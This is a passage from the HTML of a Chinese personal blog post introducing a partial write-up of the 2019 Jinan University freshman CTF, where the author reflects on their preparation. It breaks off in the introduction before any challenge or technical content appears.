<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta content="width=device-width,initial-scale=1,maximum-scale=1,shrink-to-fit=no" name="viewport"><meta content="✨小透明・宸✨" name="author"><meta content name="keywords"><meta content="非官方/部分 Write-Up，多图，预计消耗流量 3.5MB |•&#39;-&#39;•) ✧" name="description"><link href="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/favicon.png" rel="icon shortcut" type="image/ico"><link href="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/favicon.png" rel="icon"><link href="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/favicon.png" rel="apple-touch-icon"><link href="/atom.xml" rel="alternate" type="application/atom+xml"><link crossorigin href="https://cdn.jsdelivr.net" rel="preconnect"><link crossorigin href="https://p.sda1.dev" rel="preconnect"><link href="https://comment.akarin.dev" rel="dns-prefetch"><link as="image" href="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/sidebar_header.avif" rel="preload"><link as="image" href="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/avatar.jpg" rel="preload"><title>2019 年暨南大学“新生杯”CTF Write-Up | 存在感消失的地方|ω•`)</title><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://akarin.dev/2019/11/16/2019-jnu-ctf-writeup/"},"headline":"2019 年暨南大学“新生杯”CTF Write-Up","datePublished":"2019-11-16T13:50:28.000Z","dateModified":"2019-11-16T13:50:28.000Z","author":{"@type":"Person","name":"✨小透明・宸✨","image":{"@type":"ImageObject","url":"https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/avatar.jpg"},"description":"身处寒夜 把握星光✨"},"publisher":{"@type":"Organization","name":"存在感消失的地方|ω•`)","logo":"https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/favicon.png"},"keywords":"","description":"非官方/部分 Write-Up，多图，预计消耗流量 3.5MB |•'-'•) ✧"}</script><meta content="存在感消失的地方|ω•`)" property="og:site_name"><meta content="2019 年暨南大学“新生杯”CTF Write-Up" property="og:title"><meta content="非官方/部分 Write-Up，多图，预计消耗流量 3.5MB |•&#39;-&#39;•) ✧" property="og:description"><meta content="article" property="og:type"><meta content="https://akarin.dev/2019/11/16/2019-jnu-ctf-writeup/" property="og:url"><meta content="https://p.sda1.dev/12/1d73bd4e9ce069ddd80793b55abb40bb/fk7jB5oX.jpg" property="og:image"><meta content="2019-11-16T13:50:28.000Z" property="article:published_time"><meta content="2019-11-16T13:50:28.000Z" property="article:modified_time"><meta content="✨小透明・宸✨" property="article:author"><script>document.documentMode&&(location.href="../../../../upgrade-browser.html");</script><link href="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io@798f9d53d869b37aba4e6da5586b23bc5ea50e56/css/mdui.min.css" rel="stylesheet"><link href="https://cdn.jsdelivr.net/combine/gh/TransparentLC/transparentlc.github.io@798f9d53d869b37aba4e6da5586b23bc5ea50e56/css/shiki.min.css,gh/TransparentLC/transparentlc.github.io@798f9d53d869b37aba4e6da5586b23bc5ea50e56/css/style.min.css" rel="stylesheet"><style>*{--sidebar-image:image-set("https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/sidebar_header.avif" type("image/avif"), "https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/sidebar_header.webp" type("image/webp"), url(https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/sidebar_header.jpg));--sidebar-image-color:#958981;--banner-image:image-set("https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/daily_pic.avif" type("image/avif"), "https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/daily_pic.webp" type("image/webp"), url(https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/daily_pic.png));--banner-image-color:#f09ea3;--post-thumbnail-color:#f09ea3}.__s_0{--shiki-light:#4078f2;--shiki-dark:#dcdcaa}.__s_1{--shiki-light:#986801;--shiki-dark:#569cd6}.__s_2{--shiki-light:#50a14f;--shiki-dark:#ce9178}.__s_3{--shiki-light:#383a42;--shiki-dark:#d4d4d4;--shiki-light-bg:#fafafa;--shiki-dark-bg:#1e1e1e}.__s_4{--shiki-light:#a0a1a7;--shiki-light-font-style:italic;--shiki-dark:#6a9955;--shiki-dark-font-style:inherit}.__s_5{--shiki-light:#a626a4;--shiki-dark:#c586c0}.__s_6{--shiki-light:#383a42;--shiki-dark:#d4d4d4}.__s_7{--shiki-light:#986801;--shiki-dark:#b5cea8}.__s_8{--shiki-light:#a626a4;--shiki-dark:#569cd6}.__s_9{--shiki-light:#0184bc;--shiki-dark:#dcdcaa}.__s_a{--shiki-light:#0184bc;--shiki-dark:#d7ba7d}.__s_b{--shiki-light:#986801;--shiki-dark:#9cdcfe}.__s_d{--shiki-light:#0184bc;--shiki-dark:#4ec9b0}.__s_e{--shiki-light:#c18401;--shiki-dark:#4ec9b0}.__s_f{--shiki-light:#e45649;--shiki-dark:#569cd6}.__s_g{--shiki-light:#e45649;--shiki-dark:#9cdcfe}.__s_h{--shiki-light:#986801;--shiki-dark:#d4d4d4}.__s_i{--shiki-light:#e45649;--shiki-dark:#dcdcaa}</style><meta content="Hexo 8.1.1" name="generator"><script defer onload="Array.isArray(window.aplayersLite)&&aplayersLite.forEach(a=>APlayer().init(a));" src="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io@798f9d53d869b37aba4e6da5586b23bc5ea50e56/js/APlayer.min.js"></script><link as="style" href="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io@798f9d53d869b37aba4e6da5586b23bc5ea50e56/css/APlayer.min.css" onload="this.onload=null,this.rel=&quot;stylesheet&quot;;" rel="preload"><noscript> <link href="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io@798f9d53d869b37aba4e6da5586b23bc5ea50e56/css/APlayer.min.css" rel="stylesheet"> </noscript></head><body class="mdui-drawer-body-left mdui-theme-accent-pink mdui-theme-primary-pink"><svg class="registry"><defs><path id="__i_0" d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/><path id="__i_1" d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/><path id="__i_2" d="M12 4a4 4 0 0 1 4 4 4 4 0 0 1-4 4 4 4 0 0 1-4-4 4 4 0 0 1 4-4m0 10c4.42 0 8 1.79 8 4v2H4v-2c0-2.21 3.58-4 8-4"/><path id="__i_3" d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1M8 13h8v-2H8zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4a5 5 0 0 0 5-5 5 5 0 0 0-5-5"/><path id="__i_4" d="M4 6H2v14c0 1.1.9 2 2 2h14v-2H4zm16-4H8c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2m0 10-2.5-1.5L15 12V4h5z"/><path id="__i_5" d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20 5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27zm0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93z"/><path id="__i_6" d="M12 2A10 10 0 0 0 2 12c0 4.42 2.87 8.17 6.84 9.5.5.08.66-.23.66-.5v-1.69c-2.77.6-3.36-1.34-3.36-1.34-.46-1.16-1.11-1.47-1.11-1.47-.91-.62.07-.6.07-.6 1 .07 1.53 1.03 1.53 1.03.87 1.52 2.34 1.07 2.91.83.09-.65.35-1.09.63-1.34-2.22-.25-4.55-1.11-4.55-4.92 0-1.11.38-2 1.03-2.71-.1-.25-.45-1.29.1-2.64 0 0 .84-.27 2.75 1.02.79-.22 1.65-.33 2.5-.33s1.71.11 2.5.33c1.91-1.29 2.75-1.02 2.75-1.02.55 1.35.2 2.39.1 2.64.65.71 1.03 1.6 1.03 2.71 0 3.82-2.34 4.66-4.57 4.91.36.31.69.92.69 1.85V21c0 .27.16.59.67.5C19.14 20.16 22 16.42 22 12A10 10 0 0 0 12 2"/><path id="__i_7" d="M22 18v4h-4v-3h-3v-3h-3l-2.26-2.26c-.55.17-1.13.26-1.74.26a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6c0 .61-.09 1.19-.26 1.74zM7 5a2 2 0 0 0-2 2 2 2 0 0 0 2 2 2 2 0 0 0 2-2 2 2 0 0 0-2-2"/><path id="__i_8" d="M6.5 20q-2.28 0-3.89-1.57Q1 16.85 1 14.58q0-1.95 1.17-3.48 1.18-1.53 3.08-1.95.58-2.02 2.14-3.4Q8.95 4.38 11 4.08v8.07L9.4 10.6 8 12l4 4 4-4-1.4-1.4-1.6 1.55V4.08q2.58.35 4.29 2.31T19 11q1.73.2 2.86 1.5 1.14 1.28 1.14 3 0 1.88-1.31 3.19T18.5 20Z"/><path id="__i_9" d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/><path id="__i_a" d="M7.41 8.58 12 13.17l4.59-4.59L18 10l-6 6-6-6z"/><path id="__i_b" d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2M9 17H7v-7h2zm4 0h-2V7h2zm4 0h-2v-4h2z"/><path id="__i_c" d="M15.41 16.58 10.83 12l4.58-4.59L14 6l-6 6 6 6z"/><path id="__i_d" d="M8.59 16.58 13.17 12 8.59 7.41 10 6l6 6-6 6z"/></defs></svg><svg class="registry"><defs><path id="__m_0" d="M109 429q-27 0-43 18t-16 44q0 71 53 123t132 52q91 0 152-56t62-145q0-43-20-82t-48-68-80-74q-36-31-100-92l-59-56 76-1q157 0 167 5 7 2 24 89v3h40v-3q-1-3-13-91T421 3V0H50v31q0 7 6 15t30 35q29 32 50 56 9 10 34 37t34 37 29 33 28 34 23 30 21 32 15 29 13 32 7 30 3 33q0 63-34 109t-97 46q-33 0-58-17t-35-33-10-19q0-1 5-1 18 0 37-14t19-46q0-25-16-42t-45-18"/><path id="__m_1" d="M127 463q-27 0-42 17t-16 44q0 55 48 98t116 43q35 0 44-1 74-12 113-53t40-89q0-52-34-101t-94-71l-3-2q0-1 9-3t29-9 38-21q82-53 82-140 0-79-62-138T238-22q-80 0-138 43T42 130q0 28 18 45t45 18q28 0 46-18t18-45q0-11-3-20t-7-16-11-12-12-8-10-4-8-3l-4-1q51-45 124-45 55 0 83 53 17 33 17 101v20q0 95-64 127-15 6-61 7l-42 1-3 2q-2 3-2 16 0 18 8 18 28 0 58 5 34 5 62 42t28 112v8q0 57-35 79-22 14-47 14-32 0-59-11t-38-23-11-12h3q3-1 8-2t10-5 12-7 10-11 8-15 3-20q0-22-14-39t-45-18"/><path id="__m_2" d="M96 585q56 81 153 81 48 0 96-26t78-92q37-83 37-228 0-155-43-237-20-42-55-67t-61-31-51-7q-26 0-52 6t-61 32-55 67q-43 82-43 237 0 174 57 265m225 12q-30 32-71 32-42 0-72-32-25-26-33-72t-8-192q0-158 8-208t36-79q28-30 69-30 40 0 68 30 29 30 36 84t8 203q0 145-8 191t-33 73"/><path id="__m_3" d="M42 0h-2Q26 0 26 11q0 4 3 16 4 14 7 16t19 3q86 3 135 52 10 10 116 126t105 118Q302 620 297 625q-9 11-63 12h-28q-6 6-6 8t2 19q4 13 10 19h14q34-2 121-2h61q28 0 45 1t20 0q17 0 17-11 0-1-2-13-4-15-7-18t-16-3q-31-3-54-17l77-194 53 59q105 113 105 125 0 18-24 25-5 0-13 2-15 0-15 11 0 2 2 16 4 13 10 19h37q24 0 54-2t41-1q90 0 99 3h8q7-7 7-11-2-25-12-35h-16q-34-1-61-9t-41-17-24-18l-11-9q0 1-95-104l-87-96q0-1 31-80t65-162 37-86q10-9 61-10 35 0 35-9 0-2-2-14-4-16-7-19t-14-3h-33q-30 0-89 1h-93q-32 0-35-1-17 0-17 9 0 1 2 15 2 10 4 14t5 5 9 2 16 1 26 7q17 8 17 10-1 0-47 117l-47 118Q241 95 236 84q-4-8-4-12 0-19 29-25h6q5 0 6-1h4q1 0 3-1t3-3 1-7q0-9-2-16-3-13-6-15t-15-3h-18q-15 0-42 1t-59 0Q64 2 42 0"/><path id="__m_4" d="M21 287q1 6 3 16t12 38 20 47 33 37 46 17q36 0 60-18t30-34 6-21q0-2 1-2l11 11q61 64 139 64 54 0 87-27t34-79-38-157-38-127q0-26 17-26 6 0 9 1 29 5 52 38t35 80q2 8 20 8 20 0 20-8 0-1-4-15-8-29-22-57t-46-56-69-27q-47 0-68 27t-21 56q0 19 36 120t37 152q0 59-44 59h-5q-86 0-145-101l-7-12-33-134Q156 26 151 16q-13-27-43-27-13 0-21 6T76 7t-2 10q0 13 38 163t40 163q1 5 1 23 0 39-24 39-38 0-63-100-6-20-6-21-2-6-19-6H27q-6 6-6 9"/><path id="__m_5" d="M56 347q0 13 14 20h637q15-8 15-20 0-11-14-19l-318-1H72q-16 5-16 20m0-194q0 15 16 20h636q14-10 14-20 0-13-15-20H70q-14 7-14 20"/><path id="__m_6" d="M94 250q0 69 10 131t23 107 37 88 38 67 42 52 33 34 25 21h17q14 0 14-9 0-3-17-21t-41-53-49-86-42-138-17-193 17-192 41-139 49-86 42-53 17-21q0-9-15-9h-16l-28 24q-94 85-137 212T94 250"/><path id="__m_7" d="M33 157q0 101 76 192t171 92q51 0 90-49 16 30 46 30 13 0 23-8t10-20q0-13-37-160T374 68q0-25 7-33t21-9q9 1 20 9 21 20 41 96 6 20 10 21 2 1 10 1h4q19 0 19-9 0-6-5-27t-20-54-32-50Q436 0 417-8q-8-2-24-2-34 0-57 15t-30 31l-6 15q-1 1-4-1l-4-4q-59-56-120-56-55 0-97 40T33 157m318 171q0 6-5 22t-23 35-46 20q-35 0-67-31t-50-81q-29-79-41-164v-11q0-8-1-12 0-45 18-62t43-18q38 0 75 33t44 51q2 4 27 107t26 111"/><path id="__m_8" d="M630 29q0-20-21-20-5 0-22 16t-94 93L389 222 284 117Q178 13 175 11q-4-2-7-2-8 0-14 6t-7 14q0 7 14 22t94 95l104 104-104 104q-81 81-94 95t-14 22q0 9 6 14t15 5q5 0 7-1 3-2 109-106l105-105 104 104q77 77 94 93t22 16q21 0 21-20 0-7-10-18t-98-98L418 250l104-105q84-84 96-97t12-19"/><path id="__m_9" d="M84 237v13l14 20h581q15-8 15-20t-15-20H98q-14 7-14 20Z"/><path id="__m_a" d="m213 578-13-5q-14-5-40-10t-58-7H83v46h19q47 2 87 15t56 24 28 22q2 3 12 3 9 0 17-6V361l1-300q7-7 12-9t24-4 62-2h26V0h-11q-21 3-159 3-136 0-157-3H88v46h64q16 0 25 1t16 3 8 2 6 5 6 4z"/><path id="__m_b" d="M56 237v13l14 20h299v150l1 150q10 13 19 13 13 0 20-15V270h298q15-8 15-20t-15-20H409V-68q-8-14-18-14h-4q-12 0-18 14v298H70q-14 7-14 20Z"/><path id="__m_c" d="M73 647q0 10 4 23t12 13q1 0 72 5t73 6q12 0 12-9t-34-143q-8-34-17-70t-15-54l-4-19q0-3 6 3 49 40 101 40 62 0 100-46t39-116q0-111-79-201T173-11q-50 0-91 38T40 150v9q0 21 8 58t49 197q50 197 50 209t-38 14H83q-3 0-7 3t-3 7m263-322v6q0 74-61 74-17 0-35-8t-33-21-26-24-18-22l-6-8-21-86q-22-86-22-122 0-48 24-72 16-16 40-16 33 0 67 32 25 23 40 56t33 105 18 106"/><path id="__m_d" d="m60 749 4 1h22l28-24q94-85 137-212t43-264q0-68-10-131T261 12t-37-88-38-67-41-51-32-33-23-19l-4-4H63q-3 0-5 3t-3 9q1 1 11 13Q221-64 221 250T66 725q-10 12-11 13 0 8 5 11"/><path id="__m_e" d="M41 46h14q39 0 47 14v62q0 17 1 39t0 42v66q0 35-1 59v23q-3 19-14 25t-45 9H25v23q0 23 2 23l10 1q10 1 28 2t37 2q17 1 36 2t29 3 11 1h3v-40q0-38 1-38t5 5 12 15 19 18 29 19 38 16 51 5q15 0 28-2t23-6 19-8 15-9 11-11 9-11 7-11 4-10 3-8l2-5 3 4 6 8q3 4 9 11t13 13 15 13 20 12 23 10 26 7 31 3q126 0 137-113 1-7 1-139v-86q0-38 2-45t11-10q21-3 49-3h16V0h-8l-23 1q-24 1-51 1t-38 1Q596 3 587 0h-8v46h16q61 0 61 16 1 2 1 138-1 135-2 143-6 28-20 42t-24 17-26 2q-45 0-79-34-27-27-34-55t-8-83V108q0-30 1-40t3-13 9-6q21-3 49-3h16V0h-8l-24 1q-23 1-50 1t-38 1Q319 3 310 0h-8v46h16q61 0 61 16 1 2 1 138-1 135-2 143-6 28-20 42t-24 17-26 2q-45 0-79-34-27-27-34-55t-8-83V108q0-30 1-40t3-13 9-6q21-3 49-3h16V0h-8l-23 1q-24 1-51 1t-38 1Q42 3 33 0h-8v46z"/><path id="__m_f" d="M28 214q0 95 65 164t157 70q90 0 155-68t66-165q0-95-64-160T250-10q-97 0-159 67T28 214M250 30q122 0 122 163v57q0 22-1 38t-7 38-16 36-31 28-49 20q-5 1-16 1-30 0-57-12-43-22-56-61t-13-92v-20q0-96 19-135 32-61 105-61"/><path id="__m_g" d="M376 495v40q0 24 1 33 0 45-10 56t-51 13h-18v23q0 23 2 23l10 1q10 1 29 2t37 2q17 1 37 2t30 3 11 1h3V390q0-306 1-309 3-20 14-26t45-9h18V0q-2 0-76-5t-79-6h-7v55l-8-7q-58-48-130-48-77 0-139 61T34 215q0 100 63 163t147 64q75 0 132-49zm-3-153q-45 63-113 63-49 0-87-36-27-28-34-64t-8-94q0-56 7-91t35-61q30-33 78-33 71 0 122 77z"/></defs></svg>    <button class="mdui-fab mdui-m-a-2 mdui-shadow-0 mdui-text-color-grey-700" mdui-drawer="{target:'#akarin-drawer'}" style="z-index:1;position:fixed"><span class="mdui-icon"><svg viewbox="0 0 24 24"><use xlink:href="#__i_0"></use></svg></span></button>  <nav class="mdui-drawer mdui-drawer-full-height mdui-shadow-6" id="akarin-drawer"> <div class="akarin-util-bg-cover mdui-p-x-2" id="akarin-drawer-media"> <img alt="✨小透明・宸✨ 的头像" class="akarin-hover-spin mdui-img-circle mdui-m-t-4" id="akarin-drawer-avatar" src="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/avatar.jpg"> <div class="akarin-util-text-gradient mdui-card-media-covered"> <div class="mdui-card-primary"> <div class="mdui-typo-subheading">✨小透明・宸✨ </div> <div class="akarin-util-opacity-half mdui-typo-caption">存在感消失的地方|ω•`) </div> </div> </div> </div> <div class="mdui-list" mdui-collapse> <div> <a class="mdui-list-item mdui-ripple" href="../../../../"> <span class="mdui-icon mdui-list-item-icon"><svg viewbox="0 0 24 24"><use xlink:href="#__i_1"></use></svg></span> <span class="mdui-list-item-content">主页</span> </a> </div> <div> <a class="mdui-list-item mdui-ripple" href="../../../../about/"> <span class="mdui-icon mdui-list-item-icon"><svg viewbox="0 0 24 24"><use xlink:href="#__i_2"></use></svg></span> <span class="mdui-list-item-content">关于</span> </a> </div> <div> <a class="mdui-list-item mdui-ripple" href="../../../../friend/"> <span class="mdui-icon mdui-list-item-icon"><svg viewbox="0 0 24 24"><use xlink:href="#__i_3"></use></svg></span> <span class="mdui-list-item-content">友链</span> </a> </div> <div> <a class="mdui-list-item mdui-ripple" href="../../../../archives/"> <span class="mdui-icon mdui-list-item-icon"><svg viewbox="0 0 24 24"><use xlink:href="#__i_4"></use></svg></span> <span class="mdui-list-item-content">归档</span> <small class="akarin-drawer-badge mdui-color-theme-accent">38</small> </a> </div> <div> <a class="mdui-list-item mdui-ripple" href="../../../../atom.xml"> <i class="mdui-icon mdui-list-item-icon"><svg viewbox="0 0 24 24"><use xlink:href="#__i_5"></use></svg></i> <span class="mdui-list-item-content">RSS</span> </a> </div> <div class="mdui-divider"></div> <div> <a class="mdui-list-item mdui-ripple" href="https://github.com/TransparentLC" rel="noopener" target="_blank"> <span class="mdui-icon mdui-list-item-icon"><svg viewbox="0 0 24 24"><use xlink:href="#__i_6"></use></svg></span> <span class="mdui-list-item-content">GitHub</span> </a> </div> <div> <a class="mdui-list-item mdui-ripple" href="https://github.com/TransparentLC.gpg" rel="noopener" target="_blank"> <span class="mdui-icon mdui-list-item-icon"><svg viewbox="0 0 24 24"><use xlink:href="#__i_7"></use></svg></span> <span class="mdui-list-item-content">PGP 公钥</span> </a> </div> <div> <a class="mdui-list-item mdui-ripple" href="https://fuwafuwa.akarin.dev/" rel="noopener" target="_blank"> <span class="mdui-icon mdui-list-item-icon"><svg viewbox="0 0 24 24"><use xlink:href="#__i_8"></use></svg></span> <span class="mdui-list-item-content">下载站</span> </a> </div> <div class="mdui-divider"></div> <div class="mdui-collapse-item mdui-collapse-item-open"> <div class="mdui-collapse-item-header mdui-list-item mdui-ripple"> <span class="mdui-icon mdui-list-item-icon"><svg viewbox="0 0 24 24"><use xlink:href="#__i_9"></use></svg></span> <span class="mdui-list-item-content">深色模式</span> <span class="mdui-collapse-item-arrow mdui-icon"><svg viewbox="0 0 24 24"><use xlink:href="#__i_a"></use></svg></span> </div> <div class="mdui-collapse-item-body mdui-list"> <div class="mdui-list-item mdui-ripple" data-dark="auto"> <span class="mdui-list-item-content">根据系统主题切换</span> </div> <div class="mdui-list-item mdui-ripple" data-dark="enable"> <span class="mdui-list-item-content">启用</span> </div> <div class="mdui-list-item mdui-ripple" data-dark="disable"> <span class="mdui-list-item-content">禁用</span> </div> </div> </div> <div class="mdui-collapse-item mdui-collapse-item-open"> <div class="mdui-collapse-item-header mdui-list-item mdui-ripple"> <span class="mdui-icon mdui-list-item-icon"><svg viewbox="0 0 24 24"><use xlink:href="#__i_b"></use></svg></span> <span class="mdui-list-item-content">访问统计</span> <span class="mdui-collapse-item-arrow mdui-icon"><svg viewbox="0 0 24 24"><use xlink:href="#__i_a"></use></svg></span> </div> <div class="mdui-collapse-item-body mdui-list"> <div class="mdui-list-item mdui-ripple"> <span class="mdui-list-item-content">站点访问量</span> <small class="akarin-drawer-badge mdui-color-theme-accent" id="busuanzi_value_site_pv">Loading</small> </div> <div class="mdui-list-item mdui-ripple"> <span class="mdui-list-item-content">站点访客数</span> <small class="akarin-drawer-badge mdui-color-theme-accent" id="busuanzi_value_site_uv">Loading</small> </div> <div class="mdui-list-item mdui-ripple"> <span class="mdui-list-item-content">页面访问量</span> <small class="akarin-drawer-badge mdui-color-theme-accent" id="busuanzi_value_page_pv">Loading</small> </div> </div> </div> </div> </nav>  <picture id="akarin-top" title="返回顶部"> <source srcset="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/top.avif" type="image/avif"> <source srcset="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/top.webp" type="image/webp"> <img alt="返回顶部" src="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/top.png">   </picture>  <div style="padding-top:20px"></div> <div class="mdui-hidden-sm-down" style="padding-top:40px"></div> <div class="mdui-hidden-md-down" style="padding-top:40px"></div>  <main class="mdui-container" style="max-width:1024px"> <div class="akarin-util-rounded-5 mdui-card mdui-shadow-4"> <div class="akarin-post-bg akarin-util-bg-cover mdui-ripple" data-src="https://p.sda1.dev/12/1d73bd4e9ce069ddd80793b55abb40bb/fk7jB5oX.jpg" data-src-avif="https://vfile.meituan.net/mmdb/f5466b32803562f8a149f78934a2e5b461691.jpg" data-src-webp="https://p.sda1.dev/12/1368090ddc7244c4b20c60e42f277d34/bkGfLGG8.webp"> <div class="akarin-blurred akarin-post-bg akarin-util-bg-cover" style="background-image:url(data:image/webp;base64,UklGRiYEAABXRUJQVlA4IBoEAAAQEQCdASpAAC0APqE8lUmqE9PapgBgCgS2AFy+PV9XaA9Ee2N58D0R7whvI/+Hr4PFfyA+u8nGqDv1/zecm3QjK/EhpGvg/Srf1/jc+lfYH/WxjtaI8I8ZpbBFrjK0pQUHWE6u4H3bAHi8Z/O1CQ1AKirWf/XCumjdxAdmwhXkR7ucmFhKmkJjVPPbG+bqTGwAAP785ienySWZjx0L+1+czjpAkx/e/5GpoL6lUKFCVXwLnGZ5HQ7bDmLYXfo1JBqp+4lSIBnJ9HgQdlEKi4K6ioM+wflIBhiYIufMLTgrV5qshGEZ8A8QZ5E9Pbs21Mpn2RP3clA1jmMjUl+D67Pn1WcqNlEaXotGPMWaGLYcftzV+o/hudWHOoN2E2aBfs+wJCJwt8qGkMfZDKsPsvpWYWoIt7+G3yRCwxSIEVNyHoBoaPySCX9PsJ9jk9P0RZ90yP3Qr2BRjhTyRLCR1Z890fqLq3BNCXAknisuHWB3povJMbHTSBUdLH2W4VYtDaxJveCQcmHHbGwQoQBYN+YExsxJHHuwDuQ/6X5BcMYiCzkmyD+IbU9rGRtjHndRjAz0qxuJjIR1psjYz76nD4MWHGMWH8npkHdAfJmQ92iuef2a536N7MrYJ3t50/0dsOrOJb4Cn8KOv3+qS3XT+YlG6oGAlhLLcvzzvp4uuJdpGp+D4N0h0uRLt1VHPWGhsXWyrtJYgt97zLts/MU86FsFAhywRCleyTHiWy1avXCnBdZHVLZ/7VAuy18W5nM3HuZvxOSmi0gyq2mEaAO35bqIk5PT8ruTXriDGtFesnpatec/ZQoGxdKKztpkIcIzdKI2U+DWXBk/GsdknKBDbyINj+PFTiiuGgy90cbiTiHlj9/yTbd3k/jOOGyR3LZyjJ/TBCRc1pf1Iu+v64Z5IwexRwCG/UR9R5j67+Z/2auxtL81VKdQZyYrRm/XX4L1mzrW1F/i6GFLjmOygK6qAn9f+BuVCTqQUvbwGtr3LnNek0AtcJzhr/Exwsp2l9evRvsu0wzcCC4lioQhP5JbjgSEad6J/j7twxorIRkS9fmy4GzdSKNN5SpqlnFpAkmC2jy58EdiGl49qqx4KgzgGmsH01lHCxMNIRfXbf2xQ3LNrfRFPa2umYggX/nbkJd1F50dPAf1Ddr73xzHBd2wevB5lfynV+TEr3pbv+ENaKle71fMMw3o24x7/XviTGrrAeHQtCYDB4hq346A6Ofag6AGjrnaQvpKH/f+r/pqpkxqCVqgSWPGR0PHUnS6pGXYMZ4HJN7/XR6PCQtr8s8kiF1f9rDV13jriXKaU4c5E6PuLK6fH58fnNJk1ee3USEEudlADfdVhbSxg1AmwfInbVS+INzpEozvyNjz5Zy16D0oZzHDJKcj0n4AAAA)"></div> <div class="akarin-post-title akarin-util-text-gradient"> <div class="mdui-card-primary"> <div class="mdui-card-primary-title mdui-text-color-white-text"> 2019 年暨南大学“新生杯”CTF Write-Up </div> </div> </div> </div> <div class="mdui-card-header mdui-valign"> <div> <img alt="✨小透明・宸✨ 的头像" class="akarin-hover-spin mdui-card-header-avatar" src="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/img/avatar.jpg"> <div class="mdui-card-header-title">✨小透明・宸✨</div> <div class="mdui-card-header-subtitle">2019-11-16 21:50:28</div> </div> </div> <article class="mdui-card-content mdui-p-a-3 mdui-typo"> <div class="aplayer" id="__a_0" style="margin-bottom:20px"></div> <noscript><p><em>♪ START：DASH！！ - μ's</em></p><audio controls preload="metadata" src="https://fs-im-kefu.7moor-fs2.com/im/2768a390-5474-11ea-afc9-7b323e3e16c0/s5-qtR3p.m4a"></audio></noscript> <p>最近因为各种杂七杂八的事情忙到爆炸，很久都没有更新文章了，被 CTF 折腾也是忙到爆炸的原因之一_(:_」∠)_</p> <p>这个比赛其实去年小透明参加过，然鹅因为当时<del>姿势水平不足</del>，结果只能在六七十名的后排位置看菊苣们刷分。</p> <p>（重在参与，重在参与！）</p> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(124.074%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/963713727cb93cefdde11fd090f79b81/gDSJPwkd.jpg" data-src-avif="https://p.sda1.dev/12/3a04879a2b35a9658e2d22c07531b995/9krFpXb8.jpg" data-src-webp="https://p.sda1.dev/12/3876a66bb6b15c2789a98d89c7edfcbf/ZVigOPDS.webp"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRtgAAABXRUJQVlA4IMwAAABQBQCdASoaACAAPrVSok0oikoCADgFoliAL/9/+N4AKDgA1NNmK46GwANCJvTvXVBCogAA/IfD/vIKundufm/wTomw3UXDu+OEVRsFe1TorSh7fP/cT4nf/wG2In0dr6Xab5no6d8eYY8UhUUolFWnj6cOavIGYm+cEBhtolPuPrsTuFwzCCTl5t+vEfXTyZe3/hqWs30s1PD3tZMx0YV8wP292EEnJSaiRyNTTPPVQDCojVbXAUYVFw09pinHxcieDItnUJP/nDAAAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/963713727cb93cefdde11fd090f79b81/gDSJPwkd.jpg"> </noscript> </figure> <p>一年过去了，小透明似乎还是一直都没有真正意义上地“特训”过 CTF（只是在开始前一周把某在线题库的“新手区”过了一遍），结果在比赛前夕突然听说了班上有某君<strong>从暑假开始，每天练习一道 CTF 